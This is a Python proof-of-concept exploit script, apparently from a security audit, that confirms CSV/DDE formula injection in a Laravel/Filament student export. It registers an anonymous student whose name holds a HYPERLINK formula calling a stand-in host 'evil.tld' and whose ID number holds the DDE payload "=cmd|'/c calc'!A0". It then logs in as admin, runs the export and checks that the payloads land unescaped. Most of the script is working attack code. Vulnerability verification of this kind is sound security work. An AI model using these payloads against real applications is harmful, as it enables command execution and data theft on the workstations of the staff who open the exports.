#!/usr/bin/env python3
r"""
VULN-006 — CSV / DDE formula injection in Filament exports via unauthenticated name/ID.

Vulnerable code : targets/academico/app/Filament/Exports/StudentExporter.php:16-29
                     ExportColumn::make('idnumber'), 'user.lastname', 'user.firstname', ...
                  (values written to CSV cells by the openspout writer with NO formula-prefix escaping)
Source          : targets/academico/app/Livewire/RegistrationWizard.php:182-199 (unauth registration)
CWE             : CWE-1236 (Improper Neutralization of Formula Elements in a CSV File)

The flaw
--------
Filament exports render each ExportColumn value straight into a cell; the underlying
openspout CSV writer performs no CSV-injection hardening. A cell that begins with =, +, -,
@ (or tab/CR) is interpreted as a FORMULA by Excel / LibreOffice Calc when the file is
opened. The firstname/lastname/idnumber columns come from public self-registration, and the
name accessors (Str::title / Str::upper) preserve a leading formula char. So an anonymous
attacker registers with e.g. lastname == '=HYPERLINK("http://evil.tld/?"&A1,"x")' and idnumber
== a DDE payload; when a staff member exports Students to CSV, the payload lands verbatim in a
cell on their workstation.

Exploitation idea
-----------------
1. (unauth) register a student whose lastname and idnumber are spreadsheet formulas.
2. (admin) trigger the Students CSV export and let the queue render it.
3. Read the generated CSV from the server and confirm the attacker's row holds cells that
   BEGIN WITH a formula character, i.e. no neutralization was applied.

What a successful run proves
---------------------------
Attacker-controlled, unauthenticated input is written into an exported CSV as a live formula
(leading '='), with no escaping — the app-side CSV-injection defect. Whether the formula
executes depends on the opener's spreadsheet (HYPERLINK/WEBSERVICE fire readily; DDE needs
the macro/DDE prompt accepted) — that final client-side step is out of scope of an automated
server test and is called out as NEEDS_MANUAL detail in the writeup.
"""
import os
import re
import secrets
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import lwlib
from lwlib import log

VULN = "VULN-006"
HERE = os.path.dirname(os.path.abspath(__file__))
ADMIN_USER = os.environ.get("ADMIN_USER", "academico@thomasdebay.com")
ADMIN_PASS = os.environ.get("ADMIN_PASS", "secret")


def register_malicious():
    """Unauthenticated registration with formula-bearing lastname + idnumber (contacts-step
    validation bypass so register() runs). Returns (email, suffix)."""
    suffix = secrets.token_hex(4)
    email = f"csv_{suffix}@example.invalid"
    lastname = f'=HYPERLINK("http://evil.tld/{suffix}","clickme")'   # exfil-on-click formula
    idnumber = "=cmd|'/c calc'!A0"                                   # classic DDE payload
    s = lwlib.new_session()
    r = s.get(lwlib.BASE_URL + "/register", timeout=30)
    csrf = lwlib.csrf_of(r.text)
    snap = None
    for raw, sn in lwlib.snapshots(r.text):
        if "currentStep" in (sn.get("data") or {}):
            snap = raw
            break
    up = {
        "currentStep": 4, "contacts": [],
        "firstname": f"Csv{suffix}", "lastname": lastname, "email": email,
        "password": "password123", "password_confirmation": "password123",
        "gender": 1, "idnumber": idnumber, "address": "x", "birthdate": "2000-01-01",
    }
    lwlib.lw_update(s, snap, up, [{"path": "", "method": "register", "params": []}], csrf)
    stored = lwlib.tinker(f'echo App\\Models\\User::where("email","{email}")->value("lastname");').strip().splitlines()[-1]
    return email, suffix, stored


def trigger_export():
    """Admin triggers the Students CSV export (table ExportAction), then the queue renders it."""
    a = lwlib.new_session()
    if not lwlib.filament_login(a, ADMIN_USER, ADMIN_PASS):
        raise RuntimeError("admin login failed")
    r = a.get(lwlib.BASE_URL + "/admin/students", timeout=30)
    csrf = lwlib.csrf_of(r.text)
    snap, _ = lwlib.find_snapshot(r.text, "ListStudents")
    r1 = lwlib.lw_update(a, snap, {}, [{"path": "", "method": "mountAction",
                                        "params": ["export", {}, {"table": True}]}], csrf)
    ns = lwlib.response_snapshot(r1)
    r2 = lwlib.lw_update(a, ns, {}, [{"path": "", "method": "callMountedAction", "params": []}], csrf)
    # exports run as queued jobs (queue=database) -> drain them
    lwlib.container_exec("php", "artisan", "queue:work", "--stop-when-empty")
    return r2.status_code


def find_row_in_exports(needle):
    """Grep every generated export CSV for the attacker's row (by unique email)."""
    out = lwlib.container_exec(
        "sh", "-c",
        f"grep -rh {needle!r} storage/app/private/filament_exports/*/ 2>/dev/null | grep -i {needle!r} | head -1")
    return out.strip()


def main():
    lwlib.banner(VULN, "CSV/DDE formula injection in Filament Student export",
                 "StudentExporter columns written to CSV with no formula-prefix neutralization")

    log("STEP", "unauth: register a student whose lastname and idnumber are spreadsheet formulas")
    email, suffix, stored = register_malicious()
    log("SETUP", f"registered {email}; stored lastname = {stored!r} (leading '=' preserved)")

    log("STEP", "admin: trigger the Students CSV export and drain the export queue")
    code = trigger_export()
    log("INFO", f"export action HTTP {code}; queue drained")

    log("STEP", "reading the generated CSV back from the server to inspect the attacker's row")
    row = find_row_in_exports(email)
    log("INFO", f"attacker row in export CSV: {row!r}")

    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write("### 1) Unauthenticated registration with formula fields\n")
        f.write(f"POST /livewire-{lwlib.LW_HASH}/update\n\n")
        f.write('{"components":[{"snapshot":"<RegistrationWizard>","updates":{"currentStep":4,"contacts":[],'
                f'"lastname":"=HYPERLINK(\\"http://evil.tld/{suffix}\\",\\"clickme\\")","idnumber":"=cmd|\'/c calc\'!A0",'
                f'"email":"{email}",...}},"calls":[{{"path":"","method":"register","params":[]}}]}}]}}\n\n')
        f.write("### 2) Admin triggers the CSV export (table action)\n")
        f.write(f"POST /livewire-{lwlib.LW_HASH}/update  # mountAction('export',{{}},{{table:true}}) then callMountedAction\n")
    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write(f"stored lastname: {stored}\n")
        f.write(f"attacker row in exported CSV:\n{row}\n")

    # The row's cells must contain our formulas with the leading formula char intact.
    # (CSV quoting may wrap a cell in double quotes, but the '=' remains the first content char.)
    has_hyperlink = bool(re.search(r'=HYPERLINK', row, re.I))
    has_dde = "=cmd|" in row.lower() or "=cmd|" in row
    # confirm no neutralization prefix (a tab/space/apostrophe before '=') was added
    neutralized = bool(re.search(r'["\'\t ]\s*=HYPERLINK', row)) and not re.search(r'(^|,)"?=HYPERLINK', row, re.I)

    if row and has_hyperlink and has_dde and not neutralized:
        log("PROOF", "the export CSV contains the attacker's row with cells that begin with a formula "
                     "character (=HYPERLINK ... and =cmd|...), unescaped — Excel/LibreOffice will treat "
                     "them as formulas when the staff member opens the file")
        log("OK", "exploit confirmed — unauthenticated CSV/DDE formula injection into staff exports")
        lwlib.verdict(VULN, "CONFIRMED",
                      "anon registration plants live spreadsheet formulas into the Student CSV export, unescaped")
        sys.exit(0)

    log("FAIL", f"formula not found unescaped in export (hyperlink={has_hyperlink}, dde={has_dde}, "
                f"neutralized={neutralized})")
    lwlib.verdict(VULN, "FAILED", "formula injection not present in export")
    sys.exit(1)


if __name__ == "__main__":
    main()
